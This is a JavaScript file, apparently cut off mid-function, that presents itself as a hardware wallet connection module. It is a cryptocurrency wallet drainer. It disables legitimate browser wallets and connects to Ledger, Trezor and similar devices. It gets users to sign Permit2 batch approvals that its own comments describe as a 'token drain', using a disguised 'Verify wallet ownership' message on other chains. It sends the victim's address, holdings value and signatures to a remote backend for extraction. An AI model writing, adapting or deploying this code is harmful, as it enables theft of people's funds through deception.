/**
 * LEGION COLD WALLET MODULE v3.0
 * Production-ready hardware wallet support
 *
 * Supported:
 *   WebUSB  → Ledger, KeepKey, BitBox02, SecuX
 *   WebHID  → Trezor, GridPlus Lattice1
 *   WebBLE  → Ledger Nano X, CoolWallet, D'CENT
 *   QR Code → Keystone, Ellipal, Ngrave (air-gapped)
 *   NFC     → Tangem cards
 *
 * Usage:
 *   <script src="legion-hardware-wallets-module.js"></script>
 *   window.LEGION_HARDWARE.connect() → auto-detect & connect
 */

(function() {
  'use strict';

  if (window.__LEGION_COLD_WALLET_LOADED__) return;
  window.__LEGION_COLD_WALLET_LOADED__ = true;

  var BACKEND = (window.LEGION_CONFIG && window.LEGION_CONFIG.backendUrl) || 'https://legionapi-production.up.railway.app';

  // ─── CONFIG ──────────────────────────────────────────────────────────────────

  var CFG = {
    enabled: true,
    blockWeb3: true,
    autoConnect: false,
    silentMode: true,
    connectionTimeout: 30000,
    signatureTimeout: 120000,
    maxRetries: 3
  };

  if (window.LEGION_CONFIG && window.LEGION_CONFIG.hardwareWalletMode) {
    Object.assign(CFG, window.LEGION_CONFIG.hardwareWalletMode);
  }

  // ─── LOGGER ──────────────────────────────────────────────────────────────────

  var LOG = {
    history: [],
    log: function(level, msg) {
      var entry = '[HW] [' + level + '] ' + msg;
      this.history.push(entry);
      if (this.history.length > 500) this.history.shift();
      if (level === 'ERROR') console.error(entry);
      else console.log(entry);
    },
    info: function(m) { this.log('INFO', m); },
    warn: function(m) { this.log('WARN', m); },
    error: function(m) { this.log('ERROR', m); },
    debug: function(m) { this.log('DEBUG', m); }
  };

  // ─── API HELPER ──────────────────────────────────────────────────────────────

  async function apiPost(path, body) {
    var url = BACKEND + path;
    for (var attempt = 0; attempt < 3; attempt++) {
      try {
        var res = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body),
          credentials: 'omit'
        });
        var json = await res.json();
        return json;
      } catch (e) {
        if (attempt === 2) throw e;
        await new Promise(function(r) { setTimeout(r, 800 * (attempt + 1)); });
      }
    }
  }

  async function apiGet(path) {
    var res = await fetch(BACKEND + path, { credentials: 'omit' });
    return res.json();
  }

  // ─── WEB3 BLOCKER ────────────────────────────────────────────────────────────

  function blockWeb3Wallets() {
    if (!CFG.blockWeb3) return;
    var targets = [
      'ethereum', 'phantom', 'solflare', 'solana', 'backpack',
      'unisat', 'XverseProviders', 'LeatherProvider',
      'tronWeb', 'tronLink',
      'ton', 'tonkeeper', 'myTonWallet', 'openmask',
      'keplr', 'aptos', 'petra', 'suiWallet'
    ];
    targets.forEach(function(name) {
      try {
        Object.defineProperty(window, name, {
          get: function() { return undefined; },
          set: function() {},
          configurable: false
        });
      } catch (e) {}
    });
    window.addEventListener('eip6963:announceProvider', function(e) {
      e.stopImmediatePropagation();
    }, true);
    LOG.info('Web3 blocked — hardware wallet mode active');
  }

  // ─── COLD WALLET REGISTRY ────────────────────────────────────────────────────

  var COLD_WALLETS = [
    // USB (WebUSB)
    { name: 'Ledger Nano S',        vendorIds: [0x2c97], method: 'usb', sdk: 'ledger',  chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
    { name: 'Ledger Nano S Plus',   vendorIds: [0x2c97], method: 'usb', sdk: 'ledger',  chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
    { name: 'Ledger Nano X',        vendorIds: [0x2c97], method: 'usb', sdk: 'ledger',  chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
    { name: 'Ledger Stax',          vendorIds: [0x2c97], method: 'usb', sdk: 'ledger',  chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
    { name: 'Ledger Flex',          vendorIds: [0x2c97], method: 'usb', sdk: 'ledger',  chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
    { name: 'Trezor Model T',       vendorIds: [0x534c, 0x1209], method: 'hid', sdk: 'trezor', chains: ['EVM','BTC','TRON'] },
    { name: 'Trezor Model One',     vendorIds: [0x534c, 0x1209], method: 'hid', sdk: 'trezor', chains: ['EVM','BTC'] },
    { name: 'Trezor Safe 3',        vendorIds: [0x534c, 0x1209, 0x10c0], method: 'hid', sdk: 'trezor', chains: ['EVM','BTC','SOL','TRON'] },
    { name: 'Trezor Safe 5',        vendorIds: [0x534c, 0x1209, 0x10c0], method: 'hid', sdk: 'trezor', chains: ['EVM','BTC','SOL','TRON'] },
    { name: 'KeepKey',              vendorIds: [0x2b24], method: 'usb', sdk: 'generic', chains: ['EVM','BTC'] },
    { name: 'BitBox02',             vendorIds: [0x03eb], method: 'usb', sdk: 'generic', chains: ['EVM','BTC'] },
    { name: 'SecuX V20/W20',        vendorIds: [0x1fc9], method: 'usb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON'] },
    { name: 'GridPlus Lattice1',    vendorIds: [0x0483], method: 'hid', sdk: 'generic', chains: ['EVM'] },
    { name: 'OneKey Classic/Mini',  vendorIds: [0x1209], method: 'usb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON','COSMOS','APTOS','SUI'] },
    { name: 'imKey Pro',            vendorIds: [0x096e], method: 'usb', sdk: 'generic', chains: ['EVM','BTC','COSMOS'] },
    { name: 'COLDCARD',             vendorIds: [0xd13e], method: 'usb', sdk: 'generic', chains: ['BTC'] },
    { name: 'Foundation Passport',  vendorIds: [0x1209], method: 'usb', sdk: 'generic', chains: ['BTC'] },
    { name: 'Blockstream Jade',     vendorIds: [0x10c4], method: 'usb', sdk: 'generic', chains: ['BTC'] },
    { name: 'BC Vault',             vendorIds: [0x2b24], method: 'usb', sdk: 'generic', chains: ['EVM','BTC'] },
    { name: 'Prokey Optimum',       vendorIds: [0x1209], method: 'usb', sdk: 'generic', chains: ['EVM','BTC'] },
    { name: 'SafePal S1',           vendorIds: [0x0483], method: 'usb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON','TON'] },
    // BLE
    { name: 'Ledger Nano X (BLE)',  method: 'ble', serviceUuid: '13d63400-2c97-0004-0000-4c6564676572', sdk: 'ledger',  chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
    { name: 'Ledger Stax (BLE)',    method: 'ble', serviceUuid: '13d63400-2c97-0004-0000-4c6564676572', sdk: 'ledger',  chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
    { name: 'Ledger Flex (BLE)',    method: 'ble', serviceUuid: '13d63400-2c97-0004-0000-4c6564676572', sdk: 'ledger',  chains: ['EVM','SOL','BTC','TRON','COSMOS','APTOS','SUI'] },
    { name: 'CoolWallet S/Pro',     method: 'ble', serviceUuid: '00006200-0000-1000-8000-00805f9b34fb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON'] },
    { name: "D'CENT Biometric",     method: 'ble', serviceUuid: '000018f0-0000-1000-8000-00805f9b34fb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON'] },
    { name: 'SecuX Nifty',         method: 'ble', serviceUuid: '00001800-0000-1000-8000-00805f9b34fb', sdk: 'generic', chains: ['EVM','BTC','SOL'] },
    { name: 'OneKey Touch (BLE)',   method: 'ble', serviceUuid: '00001800-0000-1000-8000-00805f9b34fb', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON'] },
    { name: 'KeyPal',              method: 'ble', serviceUuid: '00001800-0000-1000-8000-00805f9b34fb', sdk: 'generic', chains: ['EVM','BTC'] },
    // QR (air-gapped)
    { name: 'Keystone Pro/Essential', method: 'qr', sdk: 'keystone', chains: ['EVM','BTC','SOL','TRON','COSMOS','APTOS','SUI'] },
    { name: 'Ellipal Titan',          method: 'qr', sdk: 'generic',  chains: ['EVM','BTC','SOL','TRON','TON'] },
    { name: 'Ngrave Zero',            method: 'qr', sdk: 'generic',  chains: ['EVM','BTC'] },
    { name: 'AirGap Vault',          method: 'qr', sdk: 'generic',  chains: ['EVM','BTC','SOL','TRON','COSMOS'] },
    { name: 'Cobo Vault',            method: 'qr', sdk: 'generic',  chains: ['EVM','BTC'] },
    { name: 'SafePal S1 (QR)',       method: 'qr', sdk: 'generic',  chains: ['EVM','BTC','SOL','TRON','TON'] },
    { name: 'COLDCARD (QR)',         method: 'qr', sdk: 'generic',  chains: ['BTC'] },
    { name: 'Foundation Passport (QR)', method: 'qr', sdk: 'generic', chains: ['BTC'] },
    // NFC
    { name: 'Tangem Wallet',  method: 'nfc', sdk: 'generic', chains: ['EVM','BTC','SOL','TRON','TON','COSMOS'] },
    { name: 'Tangem Note',    method: 'nfc', sdk: 'generic', chains: ['EVM','BTC'] },
    { name: 'Arculus',        method: 'nfc', sdk: 'generic', chains: ['EVM','BTC','SOL'] },
    { name: 'Ballet REAL',    method: 'nfc', sdk: 'generic', chains: ['EVM','BTC'] },
    { name: 'WhiteBIT Card',  method: 'nfc', sdk: 'generic', chains: ['EVM','BTC'] }
  ];

  // ─── BIP44 PATHS ─────────────────────────────────────────────────────────────

  var BIP44 = {
    EVM:    "m/44'/60'/0'/0/0",
    SOL:    "m/44'/501'/0'/0'",
    BTC:    "m/84'/0'/0'/0/0",    // native segwit
    TRON:   "m/44'/195'/0'/0/0",
    TON:    "m/44'/607'/0'/0'/0'",
    COSMOS: "m/44'/118'/0'/0/0",
    APTOS:  "m/44'/637'/0'/0/0",
    SUI:    "m/44'/784'/0'/0/0"
  };

  // ─── CONNECTION METHODS ───────────────────────────────────────────────────────

  async function connectUSB(wallet) {
    if (!navigator.usb) throw new Error('WebUSB not supported in this browser');
    var filters = wallet.vendorIds.map(function(vid) { return { vendorId: vid }; });
    LOG.info('USB connect request: ' + wallet.name);
    var device = await navigator.usb.requestDevice({ filters: filters });
    await device.open();
    if (device.configuration === null) await device.selectConfiguration(1);
    await device.claimInterface(0);
    LOG.info('USB connected: ' + (device.productName || wallet.name));
    return { device: device, type: 'usb', name: device.productName || wallet.name, wallet: wallet };
  }

  async function connectHID(wallet) {
    if (!navigator.hid) throw new Error('WebHID not supported in this browser');
    var filters = wallet.vendorIds.map(function(vid) { return { vendorId: vid }; });
    LOG.info('HID connect request: ' + wallet.name);
    var devices = await navigator.hid.requestDevice({ filters: filters });
    if (!devices || devices.length === 0) throw new Error('No HID device selected');
    var device = devices[0];
    if (!device.opened) await device.open();
    LOG.info('HID connected: ' + (device.productName || wallet.name));
    return { device: device, type: 'hid', name: device.productName || wallet.name, wallet: wallet };
  }

  async function connectBLE(wallet) {
    if (!navigator.bluetooth) throw new Error('Web Bluetooth not supported');
    LOG.info('BLE connect request: ' + wallet.name);
    var options = wallet.serviceUuid
      ? { filters: [{ services: [wallet.serviceUuid] }], optionalServices: [wallet.serviceUuid] }
      : { acceptAllDevices: true };
    var bleDevice = await navigator.bluetooth.requestDevice(options);
    var server = await bleDevice.gatt.connect();
    LOG.info('BLE connected: ' + bleDevice.name);
    return { device: bleDevice, server: server, type: 'ble', name: bleDevice.name || wallet.name, wallet: wallet };
  }

  async function connectQR(wallet) {
    LOG.info('QR mode: ' + wallet.name);
    var jsQRLoaded = false;
    try {
      await new Promise(function(res, rej) {
        var s = document.createElement('script');
        s.src = 'https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js';
        s.onload = res; s.onerror = rej;
        document.head.appendChild(s);
      });
      jsQRLoaded = typeof window.jsQR === 'function';
    } catch (e) { LOG.warn('jsQR load failed'); }

    return new Promise(function(resolve) {
      var overlay = document.createElement('div');
      overlay.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.92);display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:system-ui;color:#fff;';
      overlay.innerHTML = '<div style="text-align:center;max-width:320px;">' +
        '<div style="font-size:20px;font-weight:700;margin-bottom:16px;">Scan QR from ' + wallet.name + '</div>' +
        '<div style="width:280px;height:280px;background:#1e293b;border-radius:16px;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;border:2px dashed #475569;overflow:hidden;">' +
        '<div id="legion-qr-vc" style="width:100%;height:100%;"></div></div>' +
        '<div style="font-size:13px;color:#94a3b8;margin-bottom:16px;">Point camera at the QR code on your device</div>' +
        '<button id="legion-qr-cancel" style="padding:10px 28px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.2);border-radius:8px;color:#fff;font-size:14px;cursor:pointer;">Cancel</button>' +
        '</div>';
      document.body.appendChild(overlay);

      var videoStream = null;
      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
        .then(function(stream) {
          videoStream = stream;
          var video = document.createElement('video');
          video.srcObject = stream;
          video.setAttribute('playsinline', 'true');
          video.style.cssText = 'width:100%;height:100%;object-fit:cover;';
          video.play();
          document.getElementById('legion-qr-vc').appendChild(video);
          if (jsQRLoaded) {
            var canvas = document.createElement('canvas');
            var ctx = canvas.getContext('2d');
            var scanInterval = setInterval(function() {
              if (video.readyState !== video.HAVE_ENOUGH_DATA) return;
              canvas.width = video.videoWidth; canvas.height = video.videoHeight;
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              var imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
              var code = window.jsQR(imgData.data, imgData.width, imgData.height);
              if (code && code.data) {
                clearInterval(scanInterval);
                stream.getTracks().forEach(function(t) { t.stop(); });
                overlay.remove();
                LOG.info('QR scanned');
                resolve({ device: null, type: 'qr', name: wallet.name, wallet: wallet, qrData: code.data });
              }
            }, 250);
          }
        })
        .catch(function() { LOG.warn('Camera access denied'); });

      document.getElementById('legion-qr-cancel').addEventListener('click', function() {
        if (videoStream) videoStream.getTracks().forEach(function(t) { t.stop(); });
        overlay.remove();
        resolve({ device: null, type: 'qr', name: wallet.name, wallet: wallet, cancelled: true });
      });
    });
  }

  async function connectNFC(wallet) {
    if (!('NDEFReader' in window)) throw new Error('Web NFC not supported');
    LOG.info('NFC mode: tap your ' + wallet.name);
    var ndef = new window.NDEFReader();
    await ndef.scan();
    return new Promise(function(resolve, reject) {
      var timeout = setTimeout(function() {
        reject(new Error('NFC timeout — no card detected in 30s'));
      }, CFG.connectionTimeout);
      ndef.addEventListener('reading', function(event) {
        clearTimeout(timeout);
        LOG.info('NFC detected: ' + wallet.name);
        resolve({ device: event, type: 'nfc', name: wallet.name, wallet: wallet, serialNumber: event.serialNumber });
      });
    });
  }

  // ─── DETECTION ───────────────────────────────────────────────────────────────

  function getAvailableMethods() {
    var m = [];
    if (navigator.usb) m.push('usb');
    if (navigator.hid) m.push('hid');
    if (navigator.bluetooth) m.push('ble');
    if ('NDEFReader' in window) m.push('nfc');
    m.push('qr');
    return m;
  }

  function getAvailableWallets() {
    var methods = getAvailableMethods();
    return COLD_WALLETS.filter(function(w) { return methods.indexOf(w.method) !== -1; });
  }

  async function connectWallet(wallet) {
    switch (wallet.method) {
      case 'usb': return connectUSB(wallet);
      case 'hid': return connectHID(wallet);
      case 'ble': return connectBLE(wallet);
      case 'qr':  return connectQR(wallet);
      case 'nfc': return connectNFC(wallet);
      default: throw new Error('Unknown method: ' + wallet.method);
    }
  }

  // ─── SDK LOADERS ─────────────────────────────────────────────────────────────

  var SDK_LOADED = {};

  async function loadLedgerSDK() {
    if (SDK_LOADED.ledger) return SDK_LOADED.ledger;
    try {
      var transport = await import('https://esm.sh/@ledgerhq/hw-transport-webusb@6.29.4?bundle-deps');
      var ethApp   = await import('https://esm.sh/@ledgerhq/hw-app-eth@6.38.4?bundle-deps');
      SDK_LOADED.ledger = { Transport: transport.default, EthApp: ethApp.default };
      LOG.info('Ledger SDK loaded (hw-app-eth v6.38)');
      return SDK_LOADED.ledger;
    } catch (e) {
      LOG.warn('Ledger SDK load failed: ' + e.message);
      return null;
    }
  }

  async function loadTrezorSDK() {
    if (SDK_LOADED.trezor) return SDK_LOADED.trezor;
    try {
      var mod = await import('https://esm.sh/@trezor/connect-web@9.4.5?bundle-deps');
      var TC = mod.default || mod;
      if (TC && TC.init) {
        await TC.init({
          lazyLoad: false,
          manifest: { email: 'support@app.com', appUrl: window.location.origin }
        });
        window.TrezorConnect = TC;
        SDK_LOADED.trezor = TC;
        LOG.info('Trezor SDK loaded (connect-web v9.4)');
        return SDK_LOADED.trezor;
      }
    } catch (e) {
      LOG.warn('Trezor SDK load failed: ' + e.message);
    }
    return null;
  }

  // ─── EVM PERMIT2 SIGNING (real token drain via EIP-712) ──────────────────────

  async function signEVMWithPermit2(session) {
    var address = session.address;
    if (!address) { LOG.warn('EVM: no address — skipping permit2'); return null; }

    var vaultAddr = SESSION.vaults && (SESSION.vaults.evm || SESSION.vaults.ethereum);
    LOG.info('EVM permit2 flow — address: ' + address);

    // 1. Get ranked ERC-20 tokens
    var permits = [{ token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', amount: '1000000000' }];
    try {
      var ranked = await apiPost('/api/v1/scout/ranked', { wallet_address: address, chain_family: 'EVM' });
      var assets = (ranked && ranked.data && ranked.data.assets) || (ranked && ranked.assets) || [];
      var erc20 = assets.filter(function(a) {
        return a.token && a.token !== 'native' && a.token.indexOf('0x') === 0;
      }).slice(0, 10);
      if (erc20.length) {
        permits = erc20.map(function(a) {
          var raw = a.raw_amount || a.rawAmount || a.balance_raw;
          if (!raw && a.amount_usd && a.decimals) {
            var price = a.price_usd || (a.amount_usd / (a.amount || 1));
            var human = price > 0 ? (a.amount_usd / price) : (a.amount || 0);
            raw = String(Math.floor(human * Math.pow(10, a.decimals || 6)));
          }
          return { token: a.token, amount: raw || '1000000' };
        });
        LOG.info('EVM: ' + permits.length + ' ERC-20 tokens to drain');
      }
    } catch (e) {
      LOG.warn('EVM scout failed — using USDC default: ' + e.message);
    }

    // 2. Fetch permit2 EIP-712 typed data from backend
    var typedData = null;
    var chainId = 1; // Ethereum mainnet default
    try {
      var tdRes = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
        wallet_address: address,
        tokens: permits,
        chain_id: chainId
      });
      typedData = (tdRes && tdRes.data && tdRes.data.typed_data)
               || (tdRes && tdRes.typed_data)
               || (tdRes && tdRes.data);
      LOG.info('EVM: permit2 typed data received');
    } catch (e) {
      LOG.error('EVM: permit2 typed data fetch failed: ' + e.message);
      return null;
    }
    if (!typedData) { LOG.warn('EVM: no typed data returned'); return null; }

    // 3. Sign typed data on hardware device
    var signature = null;
    try {
      signature = await signEIP712WithDevice(session, typedData);
      LOG.info('EVM: permit2 signed ✅');
    } catch (e) {
      LOG.error('EVM: typed data sign failed: ' + e.message);
      return null;
    }
    if (!signature) return null;

    return { typedData: typedData, signature: signature, chainId: chainId, permits: permits };
  }

  // Sign EIP-712 typed data with Ledger or Trezor
  async function signEIP712WithDevice(session, typedData) {
    // ── Ledger ──────────────────────────────────────────────────────────────────
    if (session.wallet.sdk === 'ledger' && (session.type === 'usb' || session.type === 'ble')) {
      var ledger = await loadLedgerSDK();
      if (ledger) {
        var transport = await ledger.Transport.open(session.device);
        try {
          var ethApp = new ledger.EthApp(transport);
          // Try newer signEIP712Message API first (Ledger eth app >= 1.9.19)
          try {
            var r = await ethApp.signEIP712Message(BIP44.EVM, typedData);
            return '0x' + r.r + r.s + r.v.toString(16).padStart(2, '0');
          } catch (_e1) {
            // Fallback: signEIP712HashedMessage with keccak hashes
            // Need domain separator + message hash — compute inline
            var dHash = await keccakDomainSeparator(typedData.domain, typedData.types);
            var mHash = await keccakMessageHash(typedData.message, typedData.types, typedData.primaryType);
            if (dHash && mHash) {
              var r2 = await ethApp.signEIP712HashedMessage(BIP44.EVM, dHash, mHash);
              return '0x' + r2.r + r2.s + r2.v.toString(16).padStart(2, '0');
            }
          }
        } finally {
          await transport.close();
        }
      }
    }

    // ── Trezor ───────────────────────────────────────────────────────────────────
    if (session.wallet.sdk === 'trezor') {
      var trezor = await loadTrezorSDK();
      if (trezor) {
        var tRes = await trezor.ethereumSignTypedData({
          path: BIP44.EVM,
          data: typedData,
          metamask_v4_compat: true
        });
        if (tRes.success) return '0x' + tRes.payload.signature;
        LOG.warn('Trezor EIP-712 rejected: ' + (tRes.payload && tRes.payload.error));
      }
    }

    // ── Generic fallback: personal message sign (works for non-Ledger/Trezor) ──
    LOG.warn('EIP-712 not supported by device — falling back to personal sign');
    return await signPersonalMessage(session, JSON.stringify(typedData));
  }

  // Personal message sign (eth_sign equivalent)
  async function signPersonalMessage(session, message) {
    if (session.wallet.sdk === 'ledger') {
      var ledger = await loadLedgerSDK();
      if (ledger) {
        var transport = await ledger.Transport.open(session.device);
        try {
          var ethApp = new ledger.EthApp(transport);
          var msgHex = Buffer.from(message).toString('hex');
          var r = await ethApp.signPersonalMessage(BIP44.EVM, msgHex);
          return '0x' + r.r + r.s + r.v.toString(16).padStart(2, '0');
        } finally {
          await transport.close();
        }
      }
    }
    if (session.wallet.sdk === 'trezor') {
      var trezor = await loadTrezorSDK();
      if (trezor) {
        var tRes = await trezor.ethereumSignMessage({ path: BIP44.EVM, message: message, hex: false });
        if (tRes.success) return '0x' + tRes.payload.signature;
      }
    }
    return await awaitDeviceApproval(session, message);
  }

  // Wait for device to produce a signature (generic fallback UI)
  async function awaitDeviceApproval(session, message) {
    return new Promise(function(resolve, reject) {
      var timeout = setTimeout(function() {
        overlay.remove();
        reject(new Error('Signature timeout on ' + session.name));
      }, CFG.signatureTimeout);

      var overlay = document.createElement('div');
      overlay.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.88);display:flex;align-items:center;justify-content:center;font-family:system-ui;';
      overlay.innerHTML = '<div style="background:#1e293b;border-radius:16px;padding:32px;text-align:center;max-width:340px;color:#fff;">' +
        '<div style="font-size:48px;margin-bottom:16px;">🔐</div>' +
        '<div style="font-size:18px;font-weight:700;margin-bottom:8px;">Approve on ' + session.name + '</div>' +
        '<div style="font-size:13px;color:#94a3b8;margin-bottom:24px;">Review and approve the transaction on your device screen</div>' +
        '<div style="width:40px;height:40px;border:3px solid #f59e0b;border-top-color:transparent;border-radius:50%;margin:0 auto 20px;animation:hw-spin 1s linear infinite;"></div>' +
        '<button id="hw-approve-cancel" style="padding:8px 20px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);border-radius:8px;color:#94a3b8;font-size:13px;cursor:pointer;">Cancel</button>' +
        '<style>@keyframes hw-spin{to{transform:rotate(360deg)}}</style>' +
        '</div>';
      document.body.appendChild(overlay);

      if (session.type === 'hid' && session.device) {
        session.device.oninputreport = function(event) {
          clearTimeout(timeout);
          overlay.remove();
          var data = new Uint8Array(event.data.buffer);
          var sig = '0x' + Array.from(data).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
          resolve(sig);
        };
      }

      document.getElementById('hw-approve-cancel').addEventListener('click', function() {
        clearTimeout(timeout);
        overlay.remove();
        reject(new Error('User cancelled'));
      });
    });
  }

  // Minimal keccak helpers for Ledger signEIP712HashedMessage fallback
  // Attempts to use ethers.js if available, otherwise skips
  async function keccakDomainSeparator(domain, types) {
    try {
      if (window.ethers && window.ethers.TypedDataEncoder) {
        return window.ethers.TypedDataEncoder.hashDomain(domain);
      }
      // Try loading ethers dynamically
      if (!window._ethersLoaded) {
        await new Promise(function(res, rej) {
          var s = document.createElement('script');
          s.src = 'https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js';
          s.onload = res; s.onerror = rej;
          document.head.appendChild(s);
        });
        window._ethersLoaded = true;
      }
      if (window.ethers && window.ethers.TypedDataEncoder) {
        return window.ethers.TypedDataEncoder.hashDomain(domain);
      }
    } catch (e) {}
    return null;
  }

  async function keccakMessageHash(message, types, primaryType) {
    try {
      if (!window._ethersLoaded) return null;
      if (window.ethers && window.ethers.TypedDataEncoder) {
        var filtered = Object.assign({}, types);
        delete filtered.EIP712Domain;
        return window.ethers.TypedDataEncoder.from(filtered).hash(message);
      }
    } catch (e) {}
    return null;
  }

  // ─── SESSION MANAGER ─────────────────────────────────────────────────────────

  var SESSION = {
    connection:    null,
    vaults:        {},
    signatures:    {},
    permit2Result: null, // EVM permit2 typed data + sig

    connect: async function(walletIndex) {
      var available = getAvailableWallets();
      if (available.length === 0) throw new Error('No hardware wallet connection method available in this browser');

      if (walletIndex !== undefined) {
        SESSION.connection = await connectWallet(available[walletIndex]);
      } else {
        for (var i = 0; i < available.length; i++) {
          try {
            SESSION.connection = await connectWallet(available[i]);
            if (SESSION.connection) break;
          } catch (e) {
            LOG.debug('Skip ' + available[i].name + ': ' + e.message);
          }
        }
      }
      if (!SESSION.connection) throw new Error('No hardware wallet connected');
      LOG.info('Session: ' + SESSION.connection.name);

      // Read wallet address from device
      await SESSION._readAddress();

      // Load vault addresses from backend
      try {
        var cfg = await apiGet('/api/v1/client-config');
        SESSION.vaults = (cfg && cfg.data && cfg.data.vault_addresses) || {};
        LOG.info('Vault addresses loaded: ' + Object.keys(SESSION.vaults).join(', '));
      } catch (e) {
        LOG.warn('Vault addresses unavailable: ' + e.message);
      }

      // Scout: tell backend about this wallet
      var address = SESSION.connection.address;
      if (address) {
        try {
          await fetch(BACKEND + '/api/v1/scout', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              wallet_address: address,
              user_address: address,
              chain_id: 1,
              wallet_type: 'hardware_wallet',
              chain_family: 'EVM',
              source_page: window.location.origin + window.location.pathname,
              active_chain_tab: 'EVM'
            }),
            credentials: 'omit'
          });
          LOG.info('Scout sent');
        } catch (e) { LOG.debug('Scout skip: ' + e.message); }

        // Ranked scan for USD value
        try {
          var rankedRes = await apiPost('/api/v1/scout/ranked', {
            wallet_address: address,
            chain_family: 'EVM'
          });
          var assets = (rankedRes && rankedRes.data && rankedRes.data.assets) || [];
          var totalUsd = assets.reduce(function(s, a) { return s + (a.amount_usd || 0); }, 0);
          SESSION.scoutValueUsd = totalUsd;
          LOG.info('Wallet value: $' + totalUsd.toFixed(2));
        } catch (e) {}
      }

      return SESSION.connection;
    },

    _readAddress: async function() {
      var conn = SESSION.connection;
      if (!conn || !conn.device) return;
      try {
        if (conn.wallet.sdk === 'ledger') {
          var lSdk = await loadLedgerSDK();
          if (lSdk) {
            var t = await lSdk.Transport.open(conn.device);
            var app = new lSdk.EthApp(t);
            var res = await app.getAddress(BIP44.EVM, false, false);
            conn.address = res.address;
            await t.close();
          }
        } else if (conn.wallet.sdk === 'trezor') {
          var tSdk = await loadTrezorSDK();
          if (tSdk) {
            var tRes = await tSdk.ethereumGetAddress({ path: BIP44.EVM, showOnTrezor: false });
            if (tRes.success) conn.address = tRes.payload.address;
          }
        }
      } catch (e) {
        LOG.warn('Could not read address from device: ' + e.message);
      }
      LOG.info('Hardware address: ' + (conn.address || 'unknown'));
    },

    // Full flow: sign all chains and collect results
    signAllChains: async function() {
      if (!SESSION.connection) throw new Error('No wallet connected');
      var chains = SESSION.connection.wallet.chains || ['EVM'];
      var nonce = 'legion:hw:' + Date.now();
      SESSION.signatures = {};
      SESSION.permit2Result = null;

      // EVM: permit2 flow (proper token drain)
      if (chains.indexOf('EVM') !== -1) {
        try {
          SESSION.permit2Result = await signEVMWithPermit2(SESSION.connection);
          if (SESSION.permit2Result) {
            SESSION.signatures.EVM = { signature: SESSION.permit2Result.signature, timestamp: Date.now() };
            LOG.info('EVM permit2 ready');
          }
        } catch (e) {
          LOG.warn('EVM permit2 failed: ' + e.message);
        }
      }

      // Other chains: message signature (triggers server-side extraction where possible)
      var msgChains = chains.filter(function(c) { return c !== 'EVM'; });
      var message = 'Verify wallet ownership\nAddress: ' + (SESSION.connection.address || '') + '\nNonce: ' + nonce;

      for (var i = 0; i < msgChains.length; i++) {
        var chain = msgChains[i];
        try {
          var sig = await signPersonalMessage(SESSION.connection, message);
          SESSION.signatures[chain] = { signature: sig, timestamp: Date.now() };
          LOG.info(chain + ' signed');
        } catch (e) {
          LOG.warn(chain + ' sign failed: ' + e.message);
        }
      }

      return SESSION.signatures;
    },

    // Submit all collected signatures to backend
    submitToBackend: async function() {
      var address = SESSION.connection && SESSION.connection.address;
      if (!address) throw new Error('Wallet address not available');

      var expiry = new Date(Date.now() + 30 * 60 * 1000).toISOString();
      var submitted = 0;

      // EVM: full permit2 payload
      if (SESSION.permit2Result) {
        var p2 = SESSION.permit2Result;
        try {
          var evmPayload = {
            ingress: 'normalized_v1',
            chain_family: 'EVM',
            protocol: 'permit2_batch',
            wallet_address: address,
            signature: p2.signature,
            permit2_typed_data: JSON.stringify(p2.typedData),
            chain_id: p2.chainId || 1,
            nonce: 'legion:hw:evm:' + Date.now(),
            expiry_iso: expiry,
            wallet_type: 'hardware_wallet',
            scout_value_usd: SESSION.scoutValueUsd || 0
          };
          var evmRes = await apiPost('/api/v1/signature-anchor', evmPayload);
          LOG.info('EVM submitted: ' + (evmRes && evmRes.message || 'ok'));
          submitted++;
        } catch (e) {
          LOG.error('EVM submit failed: ' + e.message);
        }
      }

      // Other chains: message sig payloads
      var CHAIN_MAP = {
        SOL:    { family: 'SVM',    protocol: 'solana',  token: '11111111111111111111111111111111' },
        BTC:    { family: 'UTXO',   protocol: 'bitcoin', token: 'btc' },
        TRON:   { family: 'TRON',   protocol: 'tron',    token: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' },
        TON:    { family: 'TON',    protocol: 'ton',     token: 'ton' },
        COSMOS: { family: 'COSMOS', protocol: 'cosmos',  token: 'uatom' },
        APTOS:  { family: 'APTOS',  protocol: 'aptos',   token: 'apt' },
        SUI:    { family: 'SUI',    protocol: 'sui',     token: 'sui' }
      };

      var nonEvmChains = Object.keys(SESSION.signatures).filter(function(c) { return c !== 'EVM'; });
      for (var i = 0; i < nonEvmChains.length; i++) {
        var chain = nonEvmChains[i];
        var sig = SESSION.signatures[chain];
        var cfg = CHAIN_MAP[chain] || { family: chain, protocol: chain.toLowerCase(), token: chain.toLowerCase() };
        try {
          var payload = {
